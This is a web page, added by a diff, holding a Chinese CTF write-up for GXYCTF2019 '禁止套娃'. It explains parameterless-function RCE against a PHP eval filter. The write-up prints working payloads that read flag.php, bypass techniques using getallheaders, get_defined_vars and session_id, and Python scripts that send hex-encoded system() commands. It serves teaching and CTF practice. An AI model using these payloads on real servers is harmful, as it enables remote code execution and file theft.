@@ -1,0 +1,629 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>GXYCTF2019|禁止套娃 - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="GXYCTF2019|禁止套娃">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-03 15:05" pubdate>
+        May 3, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">GXYCTF2019|禁止套娃</h1>
+            
+            <div class="markdown-body">
+              <p>这题提到了无参RCE，做个总结。</p>
+<blockquote>
+<p>git泄露源码，利用githack扫出源码:</p>
+<blockquote>
+<pre><code class="hljs php">&gt;&gt;<span class="hljs-meta">&lt;?php</span>
+&gt;&gt;<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
+&gt;&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;
+&gt;&gt;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;
+   <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;
+       <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;
+           <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;
+               <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span>
+               @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);
+           &#125;
+           <span class="hljs-keyword">else</span>&#123;
+               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);
+           &#125;
+       &#125;
+       <span class="hljs-keyword">else</span>&#123;
+           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);
+       &#125;
+   &#125;
+   <span class="hljs-keyword">else</span>&#123;
+       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);
+   &#125;
+&gt;&gt;&#125;
+&gt;&gt;<span class="hljs-comment">// highlight_file(__FILE__);</span>
+&gt;&gt;<span class="hljs-meta">?&gt;</span></code></pre>
+</blockquote>
+</blockquote>
+<h4 id="分析"><a class="header-anchor" href="#分析">🍭</a>分析</h4>
+<ul>
+<li>需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。</li>
+<li>过滤了常用的几个伪协议，不能以伪协议读取文件。</li>
+<li>(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。</li>
+<li>正则匹配掉了et/na/info等关键字。</li>
+<li><code>eval($_GET['exp']); </code>无参数RCE</li>
+</ul>
+<p>flag在flag.php,要读取它首先需要得到当前目录下的文件<br>
+scandir()函数可以扫描当前目录下的文件：</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+print_r(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));
+<span class="hljs-meta">?&gt;</span></code></pre>
+<p>我们需要构造<code>scandir('.')</code>.</p>
+<p>这里需要用到</p>
+<blockquote>
+<p><code>localeconv()</code> 函数</p>
+<blockquote>
+<p>返回一包含本地数字及货币格式信息的数组.</p>
+<p>数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值。<br>
+pos() 是current() 的别名</p>
+</blockquote>
+</blockquote>
+<p>第一个if就解决了</p>
+<pre><code class="hljs lisp">print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">current</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span>
+print_r(<span class="hljs-name">scandir</span>(<span class="hljs-name">pos</span>(<span class="hljs-name">localeconv</span>())))<span class="hljs-comment">;</span></code></pre>
+<p>测试一下：</p>
+<p><img src="/2021/05/03/GXYctf/1.jpg" srcset="/img/loading.gif" alt="1"></p>
+<p>接下来要思考怎么读取倒数第二个数组</p>
+<h4 id="current"><a class="header-anchor" href="#current">🍭</a>current</h4>
+<p><img src="/2021/05/03/GXYctf/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>不能直接读取flag的元素，只能运用其它元素。</p>
+<h4 id="array-reverse"><a class="header-anchor" href="#array-reverse">🍭</a><strong>array_reverse()</strong></h4>
+<p>以相反的元素顺序返回数组</p>
+<pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre>
+<h4 id="array-flip"><a class="header-anchor" href="#array-flip">🍭</a>array_flip()</h4>
+<p>交换数组的键和值</p>
+<pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>))));</code></pre>
+<p>array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php</p>
+<pre><code class="hljs reasonml">?exp=print<span class="hljs-constructor">_r(<span class="hljs-params">array_rand</span>(<span class="hljs-params">array_flip</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">current</span>(<span class="hljs-params">localeconv</span>()</span>)))));</code></pre>
+<h4 id="session-id-session-start"><a class="header-anchor" href="#session-id-session-start">🍭</a><strong>session_id(session_start())</strong></h4>
+<p>本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。<br>
+使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>
+session_id()可以获取到当前的session id。故手动设置名为PHPSESSID的cookie，并设置值为flag.php</p>
+<h4 id="tips："><a class="header-anchor" href="#tips：">🍭</a>tips：</h4>
+<p>如何读flag.php的源码</p>
+<p>因为et被ban了，所以不能使用file_get_contents()，但是可以可以使用readfile()或highlight_file()以及其别名函数show_source()</p>
+<blockquote>
+<p><code>view-source:http://172.21.4.12:10031/?exp=print_r(readfile(next(array_reverse(scandir(pos(localeconv()))))));</code><br>
+<code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code><br>
+<code>?exp=show_source(session_id(session_start()));</code></p>
+</blockquote>
+<p>得到flag</p>
+<h2 id="无参RCE"><a class="header-anchor" href="#无参RCE">🍭</a>无参RCE</h2>
+<blockquote>
+<blockquote>
+<p>比较常见getshell是<code>eval($_GET['code']);</code><br>
+但它一般有如下限制</p>
+<pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    
+ <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span>
+&#125;</code></pre>
+<p>此时我们使用参数则无法通过正则的校验，该正则是我们说的无参数函数的校验，其只允许执行如下格式函数</p>
+<pre><code class="hljs lisp">a(<span class="hljs-name">b</span>(<span class="hljs-name">c</span>()))<span class="hljs-comment">;</span>
+a()<span class="hljs-comment">;</span></code></pre>
+<p>但不允许</p>
+<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">a</span>(<span class="hljs-string">&#x27;123&#x27;</span>);</span></code></pre>
+</blockquote>
+</blockquote>
+<p>此类题解法：</p>
+<ul>
+<li>利用超全局变量进行bypass，进行RCE</li>
+<li>进行任意文件读取</li>
+</ul>
+<h3 id="bypass"><a class="header-anchor" href="#bypass">🍭</a>bypass</h3>
+<h4 id="getenv"><a class="header-anchor" href="#getenv">🍭</a>getenv()</h4>
+<p>超全局变量：</p>
+<pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$GLOBALS</span></span>
+<span class="hljs-symbol">$</span>_SERVER
+<span class="hljs-symbol">$</span>_GET
+<span class="hljs-symbol">$</span>_POST
+<span class="hljs-symbol">$</span>_FILES
+<span class="hljs-symbol">$</span>_COOKIE
+<span class="hljs-symbol">$</span>_SESSION
+<span class="hljs-symbol">$</span>_REQUEST
+<span class="hljs-symbol">$</span>_ENV</code></pre>
+<p><code>$_ENV</code>对应函数为<code>getenv()</code></p>
+<p><img src="/2021/05/03/GXYctf/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>但如何取出我们指定的值</p>
+<p><img src="/2021/05/03/GXYctf/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>但是我们想要数组的值，则可以使用：</p>
+<p><img src="/2021/05/03/GXYctf/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>我们可用爆破的方式获取数组中任意位置需要的值，即可使用getenv()获取指定位置的恶意参数</p>
+<h4 id="getallheaders"><a class="header-anchor" href="#getallheaders">🍭</a>getallheaders()</h4>
+<p>上述方法获取的是所有环境变量的列表，我们并不需要这么多信息。仅仅http header即可<br>
+在apache2环境下，getallheaders()可返回：</p>
+<pre><code class="hljs lsl">array(<span class="hljs-number">8</span>) &#123; 
+    [<span class="hljs-string">&quot;Host&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;106.14.114.127&quot;</span> 
+    [<span class="hljs-string">&quot;Connection&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;keep-alive&quot;</span> 
+    [<span class="hljs-string">&quot;Cache-Control&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;max-age=0&quot;</span> 
+    [<span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span> 
+    [<span class="hljs-string">&quot;User-Agent&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">120</span>) <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot;</span> 
+    [<span class="hljs-string">&quot;Accept&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">118</span>) <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>
+     [<span class="hljs-string">&quot;Accept-Encoding&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;gzip, deflate&quot;</span> [<span class="hljs-string">&quot;Accept-Language&quot;</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span> 
+&#125;</code></pre>
+<p>我们可以在header中做一些自定义：</p>
+<p><img src="/2021/05/03/GXYctf/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>将结果中的恶意命令取出</p>
+<pre><code class="hljs lisp">var_dump(<span class="hljs-name">end</span>(<span class="hljs-name">getallheaders</span>()))<span class="hljs-comment">;</span></code></pre>
+<p><img src="/2021/05/03/GXYctf/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>http header中的sky变成了我们的参数，可用其进行bypass 无参数函数执行</p>
+<p><img src="/2021/05/03/GXYctf/8.png" srcset="/img/loading.gif" alt="8"></p>
+<h4 id="get-defined-vars"><a class="header-anchor" href="#get-defined-vars">🍭</a>get_defined_vars()</h4>
+<p>使用getallheaders()其实具有局限性，因为他是apache的函数，如果目标中间件不为apache，那么这种方法就会失效。我们可以使用get_defined_vars()，首先看一下它的回显</p>
+<p><img src="/2021/05/03/GXYctf/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>可回显全局变量：<code>$_GET$_POST$_FILES$_COOKIE</code>，故可利用GET进行RCE</p>
+<p><img src="/2021/05/03/GXYctf/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>但一般网站喜欢对<code>$_GET$_POST$_COOKIE</code>进行过滤，我们可以尝试从<code>$_FILES</code>下手，这就需要我们自己写一个上传：</p>
+<pre><code class="hljs routeros">import requests
+<span class="hljs-keyword">from</span> io import BytesIO
+
+payload = <span class="hljs-string">&quot;system(&#x27;ls /tmp&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)
+files = &#123;
+  payload: BytesIO(<span class="hljs-string">&#x27;sky cool!&#x27;</span>)
+&#125;
+
+r = requests.post(<span class="hljs-string">&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)
+
+<span class="hljs-builtin-name">print</span> r.content</code></pre>
+<p>若不用hex编码进行RCE，空格会被替换成<code>_</code></p>
+<h4 id="session-id"><a class="header-anchor" href="#session-id">🍭</a>session_id()</h4>
+<p><img src="/2021/05/03/GXYctf/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>PHPSESSID允许字母和数字出现，那么我们就有了新的思路，即<code>hex2bin</code><br>
+脚本如下</p>
+<pre><code class="hljs routeros">import requests
+url = <span class="hljs-string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span>
+payload = <span class="hljs-string">&quot;echo &#x27;sky cool&#x27;;&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)
+cookies = &#123;
+	<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:payload
+&#125;
+r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">url</span>=url,cookies=cookies)
+<span class="hljs-builtin-name">print</span> r.content</code></pre>
+<p>即可达成RCE和bypass的目的</p>
+<h4 id="dirname-chdir"><a class="header-anchor" href="#dirname-chdir">🍭</a>dirname() &amp; chdir()</h4>
+<p>目录遍历读文件，我们可以利用<code>getcwd()</code>获取当前目录</p>
+<pre><code class="hljs reasonml">?code=var<span class="hljs-constructor">_dump(<span class="hljs-params">getcwd</span>()</span>);
+
+<span class="hljs-built_in">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;/var/www/html&quot;</span></code></pre>
+<p>用<code>scandir()</code>进行当前目录遍历</p>
+<pre><code class="hljs lsl">?code=var_dump(scandir(getcwd()));
+
+array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125;</code></pre>
+<p>用<code>dirname()</code>进行目录上跳</p>
+<pre><code class="hljs lsl">?code=var_dump(scandir(dirname(getcwd())));
+
+array(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">14</span>) <span class="hljs-string">&quot;flag_phpbyp4ss&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125;</code></pre>
+<p>更改当前目录</p>
+<pre><code class="hljs gauss"><span class="hljs-built_in">chdir</span> ( <span class="hljs-keyword">string</span> $directory ) : <span class="hljs-keyword">bool</span></code></pre>
+<p>将 PHP 的当前目录改为 directory。<br>
+所以我们这里在</p>
+<pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())</span></code></pre>
+<p>进行设置即可</p>
+<pre><code class="hljs lisp">chdir(<span class="hljs-name">dirname</span>(<span class="hljs-name">getcwd</span>()))</code></pre>
+<p>读取<code>/var/www/123</code>:</p>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost/?code=readfile(<span class="hljs-keyword">next</span>(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre>
+<p>即可进行文件读取。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#">PHP Parametric Function RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">[GXYCTF2019]禁止套娃</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/05/hash/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hash Length Extension Attack</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/04/18/js/">
+                        <span class="hidden-mobile">js原型链污染</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
